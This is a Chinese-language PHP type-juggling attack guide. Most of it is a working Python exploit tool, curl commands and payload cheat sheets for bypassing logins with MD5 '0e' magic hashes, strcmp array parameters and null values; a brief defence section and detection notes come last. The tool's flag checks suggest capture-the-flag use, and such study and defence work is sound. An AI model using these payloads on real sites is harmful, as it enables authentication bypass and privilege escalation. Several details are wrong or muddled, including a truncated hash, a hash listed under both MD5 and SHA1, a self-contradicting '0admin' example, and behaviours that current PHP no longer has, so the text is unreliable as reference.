# PHP类型比较漏洞攻击库

## 概述

PHP类型比较漏洞是由于PHP弱类型语言特性导致的安全问题,主要包括宽松比较(`==`)、类型转换、魔术哈希等。攻击者可以利用这些特性绕过身份验证、权限检查等安全机制。

**核心威胁**: 宽松比较运算符 → 类型自动转换 → 意外的相等判断 → 认证绕过/权限提升

## PHP类型比较原理

### 宽松比较 vs 严格比较

```php
// 宽松比较 (==) - 会进行类型转换
"123" == 123  // true
"0e12345" == 0  // true (科学计数法)
[] == false  // true
null == false  // true

// 严格比较 (===) - 不进行类型转换
"123" === 123  // false
"0e12345" === 0  // false
[] === false  // false
```

### 科学计数法类型转换

```php
// 以0e开头且后面全是数字的字符串会被解释为0
var_dump("0e123456" == 0);  // bool(true)
var_dump("0e999999" == "0e111111");  // bool(true)

// MD5魔术哈希
md5("240610708") == md5("QNKCDZO")  // true
// 因为:
// md5("240610708") = "0e462097431906509019562988736854"
// md5("QNKCDZO") = "0e830400451993494058024219903391"
```

### strcmp数组绕过

```php
// strcmp返回值: <0, 0, >0
// 当参数为数组时返回NULL

strcmp("password", array()) === 0  // false (因为NULL !== 0)
strcmp("password", array()) == 0   // true (因为NULL == 0)
```

## 核心攻击技术

### 1. MD5魔术哈希绕过

**技术**: 利用MD5哈希值的科学计数法特性绕过密码验证

```php
// 易受攻击代码
$password_hash = "0e678703625362188185747119782643";  // 目标hash
if (md5($_POST['password']) == $password_hash) {
    // 登录成功
}
```

**已知MD5魔术哈希**:
```
240610708 → 0e462097431906509019562988736854
QNKCDZO → 0e830400451993494058024219903391
aabg7XSs → 0e087386449306905733016695567647
aaK1STfY → 0e766592441101527258662944562823
```

**应用场景**:
- 密码验证使用`==`比较MD5
- 重置令牌验证
- API密钥验证

### 2. strcmp数组绕过

**技术**: 传递数组导致strcmp返回NULL,NULL==0为true

```php
// 易受攻击代码
if (strcmp($_POST['password'], $real_password) == 0) {
    // 登录成功
}
```

**利用方式**:
```bash
# GET请求
curl "http://target/?password[]="

# POST请求
curl -X POST http://target/ -d "password[]="
```

**应用场景**:
- 使用strcmp进行密码验证
- 使用strcmp进行令牌验证
- 未定义变量与strcmp结合

### 3. 数字字符串比较

**技术**: PHP会将字符串转换为数字进行比较

```php
"0" == 0       // true
"0x01" == 1    // true (hex)
"1e3" == 1000  // true (科学计数法)
"10 test" == 10  // true (前导数字)
```

**利用**:
```php
// 易受攻击代码
if ($_GET['id'] == "admin") {
    // 管理员操作
}

// 绕过: ?id=0
// 因为 0 == "admin" 可能在某些情况下为false
// 但 "0admin" == 0 为true
```

### 4. 空值比较绕过

**技术**: NULL、空字符串、0、false在宽松比较下相等

```php
NULL == false    // true
NULL == 0        // true
NULL == ""       // true
false == 0       // true
false == ""      // true
```

**利用场景**:
```php
// 未定义变量导致NULL
if ($_SESSION['is_admin'] == true) {
    // 如果$_SESSION['is_admin']未定义,则为NULL
    // NULL == true 为false
}

// 但如果代码是:
if (!$_SESSION['is_admin'] == false) {
    // NULL == false 为true,条件成立
}
```

### 5. 数组与标量比较

**技术**: 数组与标量比较时会进行类型转换

```php
array() == 0      // true
array() == false  // true
array() == ""     // true
array(1) > 0      // true
```

## 完整攻击工具

### PHP类型比较漏洞利用工具

```python
#!/usr/bin/env python3
"""
PHP类型比较漏洞自动化利用工具
支持MD5魔术哈希、strcmp绕过、类型混淆等
"""

import requests
import hashlib
import sys

class PHPTypeJuggling:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        
        # 预定义的MD5魔术哈希
        self.md5_magic_hashes = [
            "240610708",
            "QNKCDZO",
            "aabg7XSs",
            "aaK1STfY",
            "aabC9RqS",
            "0e215962017",
            "129581926211651571912466741651878684928",
        ]
        
        # 预定义的SHA1魔术哈希
        self.sha1_magic_hashes = [
            "aaroZmOk",
            "aaK1STfY",
            "aaO8zKZF",
            "aa3OFF9m",
        ]
    
    def test_md5_magic_hash(self):
        """
        测试MD5魔术哈希绕过
        
        Returns:
            成功的密码或None
        """
        print("[*] 测试MD5魔术哈希绕过...")
        
        for password in self.md5_magic_hashes:
            hash_value = hashlib.md5(password.encode()).hexdigest()
            print(f"[*] 尝试: {password} → {hash_value}")
            
            # 检查是否符合0e格式
            if hash_value.startswith("0e") and hash_value[2:].isdigit():
                print(f"[+] 发现魔术哈希: {password}")
                
                # 尝试POST登录
                try:
                    r = self.session.post(self.target, data={
                        'password': password
                    }, timeout=10)
                    
                    if 'flag{' in r.text.lower() or 'congratulations' in r.text.lower():
                        print(f"[+] 成功! 使用密码: {password}")
                        return password
                        
                except Exception as e:
                    print(f"[-] 请求错误: {e}")
        
        print("[-] MD5魔术哈希绕过失败")
        return None
    
    def test_strcmp_bypass(self):
        """
        测试strcmp数组绕过
        
        Returns:
            bool: 是否成功
        """
        print("[*] 测试strcmp数组绕过...")
        
        payloads = [
            # GET方式
            {'url': f"{self.target}?password[]", 'method': 'GET'},
            {'url': f"{self.target}?password[]=", 'method': 'GET'},
            {'url': f"{self.target}?username=admin&password[]", 'method': 'GET'},
            
            # POST方式
            {'data': {'password[]': ''}, 'method': 'POST'},
            {'data': {'username': 'admin', 'password[]': ''}, 'method': 'POST'},
        ]
        
        for payload in payloads:
            try:
                if payload['method'] == 'GET':
                    r = self.session.get(payload['url'], timeout=10)
                else:
                    r = self.session.post(self.target, data=payload['data'], timeout=10)
                
                if 'flag{' in r.text.lower() or 'congratulations' in r.text.lower():
                    print(f"[+] strcmp绕过成功! Payload: {payload}")
                    return True
                    
            except Exception as e:
                print(f"[-] 错误: {e}")
        
        print("[-] strcmp绕过失败")
        return False
    
    def test_null_comparison(self):
        """
        测试空值比较绕过
        
        Returns:
            bool: 是否成功
        """
        print("[*] 测试空值比较绕过...")
        
        payloads = [
            {'password': ''},
            {'password': '0'},
            {'password': 'null'},
            {'username': 'admin'},  # 缺少password
        ]
        
        for payload in payloads:
            try:
                r = self.session.post(self.target, data=payload, timeout=10)
                
                if 'flag{' in r.text.lower() or 'congratulations' in r.text.lower():
                    print(f"[+] 空值绕过成功! Payload: {payload}")
                    return True
                    
            except Exception as e:
                pass
        
        return False
    
    def generate_md5_magic_hash(self, max_attempts=100000):
        """
        生成新的MD5魔术哈希
        
        Args:
            max_attempts: 最大尝试次数
        
        Returns:
            找到的魔术哈希字符串或None
        """
        print(f"[*] 生成MD5魔术哈希(最多尝试{max_attempts}次)...")
        
        for i in range(max_attempts):
            test_str = str(i)
            hash_val = hashlib.md5(test_str.encode()).hexdigest()
            
            if hash_val.startswith("0e") and hash_val[2:].isdigit():
                print(f"[+] 找到魔术哈希: {test_str} → {hash_val}")
                return test_str
            
            if i % 10000 == 0:
                print(f"[*] 已尝试 {i} 次...")
        
        print("[-] 未找到新的魔术哈希")
        return None
    
    def full_exploit(self):
        """
        完整利用流程
        """
        print("=" * 60)
        print("[*] PHP类型比较漏洞完整利用")
        print("=" * 60)
        
        # 1. 尝试MD5魔术哈希
        print("\n[*] 步骤1: 尝试MD5魔术哈希绕过...")
        if self.test_md5_magic_hash():
            return True
        
        # 2. 尝试strcmp绕过
        print("\n[*] 步骤2: 尝试strcmp数组绕过...")
        if self.test_strcmp_bypass():
            return True
        
        # 3. 尝试空值比较
        print("\n[*] 步骤3: 尝试空值比较绕过...")
        if self.test_null_comparison():
            return True
        
        # 4. 生成新的魔术哈希
        print("\n[*] 步骤4: 尝试生成新的MD5魔术哈希...")
        new_hash = self.generate_md5_magic_hash(10000)
        if new_hash:
            # 尝试使用新生成的哈希
            r = self.session.post(self.target, data={'password': new_hash})
            if 'flag{' in r.text.lower():
                print("[+] 新魔术哈希成功!")
                return True
        
        return False

def exploit_php_type_juggling(target_url):
    """
    PHP类型比较漏洞利用入口
    
    Args:
        target_url: 目标URL
    """
    print(f"[*] 目标: {target_url}")
    print()
    
    exploiter = PHPTypeJuggling(target_url)
    success = exploiter.full_exploit()
    
    if success:
        print("\n[+] 攻击成功!")
    else:
        print("\n[-] 攻击未成功")

# MD5魔术哈希生成器
def generate_md5_magic_hashes(count=10):
    """
    生成指定数量的MD5魔术哈希
    
    Args:
        count: 要生成的数量
    """
    print(f"[*] 生成MD5魔术哈希...")
    
    found = 0
    i = 0
    
    while found < count:
        test_str = str(i)
        hash_val = hashlib.md5(test_str.encode()).hexdigest()
        
        if hash_val.startswith("0e") and hash_val[2:].isdigit():
            print(f"[+] {test_str} → {hash_val}")
            found += 1
        
        i += 1
        
        if i % 100000 == 0:
            print(f"[*] 已搜索 {i} 个字符串,找到 {found} 个...")

# 快速strcmp绕过测试
def quick_strcmp_bypass(target):
    """
    快速strcmp绕过测试
    
    Args:
        target: 目标URL
    """
    print(f"[*] 快速strcmp绕过测试")
    print(f"[*] 目标: {target}")
    
    # GET方式
    try:
        r = requests.get(f"{target}?password[]", timeout=10)
        if 'flag{' in r.text.lower() or 'welcome' in r.text.lower():
            print(f"[+] GET方式成功: {target}?password[]")
            print(f"[+] 响应:\n{r.text[:200]}")
            return True
    except:
        pass
    
    # POST方式
    try:
        r = requests.post(target, data={'password[]': ''}, timeout=10)
        if 'flag{' in r.text.lower() or 'welcome' in r.text.lower():
            print(f"[+] POST方式成功")
            print(f"[+] 响应:\n{r.text[:200]}")
            return True
    except:
        pass
    
    print("[-] strcmp绕过失败")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法:")
        print(f"  {sys.argv[0]} <target_url>")
        print(f"  {sys.argv[0]} --generate <count>")
        print()
        print("示例:")
        print(f"  {sys.argv[0]} http://target")
        print(f"  {sys.argv[0]} --generate 10")
        sys.exit(1)
    
    if sys.argv[1] == '--generate':
        count = int(sys.argv[2]) if len(sys.argv) > 2 else 10
        generate_md5_magic_hashes(count)
    else:
        target = sys.argv[1]
        exploit_php_type_juggling(target)
```

## 实战场景

### 场景1: MD5魔术哈希绕过

**易受攻击代码**:
```php
$stored_hash = "0e678703625362188185747119782643";
if (md5($_POST['password']) == $stored_hash) {
    echo "Login success!";
}
```

**利用**:
```bash
curl -X POST http://target/ -d "password=240610708"
# md5("240610708") = "0e462097431906509019562988736854"
# "0e462..." == "0e678..." → true
```

### 场景2: strcmp数组绕过

**易受攻击代码**:
```php
if ($_GET['username'] == "admin" && strcmp($_GET['password'], $real_pwd) == 0) {
    echo "Welcome admin!";
}
```

**利用**:
```bash
curl "http://target/?username=admin&password[]="
# strcmp(array(), $real_pwd) 返回 NULL
# NULL == 0 为 true
```

### 场景3: 未定义变量绕过

**易受攻击代码**:
```php
if (strcmp($_GET['password'], $password) == 0) {
    // $password未定义,值为NULL
}
```

**利用**:
```bash
curl "http://target/?password[]="
# strcmp(array(), NULL) 返回 NULL
# NULL == 0 为 true
```

## 手动测试命令

### MD5魔术哈希测试

```bash
# 1. 测试已知魔术哈希
curl -X POST http://target/ -d "password=240610708"
curl -X POST http://target/ -d "password=QNKCDZO"

# 2. 验证哈希
php -r "echo md5('240610708');"
# 输出: 0e462097431906509019562988736854
```

### strcmp绕过测试

```bash
# 1. GET方式
curl "http://target/?password[]"
curl "http://target/?password[]="
curl "http://target/?username=admin&password[]"

# 2. POST方式
curl -X POST http://target/ -d "password[]="
curl -X POST http://target/ -d "username=admin&password[]="
```

### 类型混淆测试

```bash
# 空值测试
curl -X POST http://target/ -d "password="
curl -X POST http://target/ -d "password=0"

# 数组测试
curl -X POST http://target/ -d "password[]=test"
```

## Payload速查表

### MD5魔术哈希列表

```
# 字符串 → MD5哈希
240610708 → 0e462097431906509019562988736854
QNKCDZO → 0e830400451993494058024219903391
aabg7XSs → 0e087386449306905733016695567647
aaK1STfY → 0e766592441101527258662944562823
aabC9RqS → 0e041022518165728065
0e215962017 → 0e291242476940776845150308577824
```

### strcmp绕过Payload

```bash
# GET
?password[]
?password[]=
?password[0]=
?username=admin&password[]

# POST
password[]=
password[0]=
username=admin&password[]=
```

### 类型混淆Payload

```php
# 空值
password=
password=0
password=null

# 数组
password[]=
password[]=value
```

## 防御措施

### 1. 使用严格比较

```php
// 错误
if (md5($password) == $stored_hash) { }

// 正确
if (md5($password) === $stored_hash) { }
```

### 2. 类型检查

```php
// 检查变量类型
if (is_string($_POST['password']) && md5($_POST['password']) === $hash) { }

// strcmp前检查
if (is_string($_POST['password']) && strcmp($_POST['password'], $real) === 0) { }
```

### 3. 使用password_hash

```php
// 存储密码
$hash = password_hash($password, PASSWORD_DEFAULT);

// 验证密码
if (password_verify($_POST['password'], $hash)) {
    // 登录成功
}
```

### 4. 输入验证

```php
// 验证输入不是数组
if (is_array($_POST['password'])) {
    die("Invalid input");
}
```

## 检测特征

1. **魔术哈希**: 密码为短数字或字母组合
2. **数组参数**: 请求中包含`password[]`
3. **空值**: password参数为空或0
4. **strcmp异常**: strcmp相关的Warning

## 相关CVE

- 无特定CVE,这是PHP语言特性导致的通用问题
- 影响所有使用宽松比较的PHP应用

## 总结

PHP类型比较漏洞是由语言特性导致的安全问题,主要利用点:
- 宽松比较(`==`)自动类型转换
- 科学计数法解析(0e开头)
- strcmp对数组参数返回NULL
- NULL与0宽松比较相等

**关键攻击路径**: 识别宽松比较 → 选择合适绕过技术(魔术哈希/数组/空值) → 绕过验证 → 权限提升

**最简单利用**: strcmp绕过只需`password[]`参数,MD5魔术哈希有现成列表。
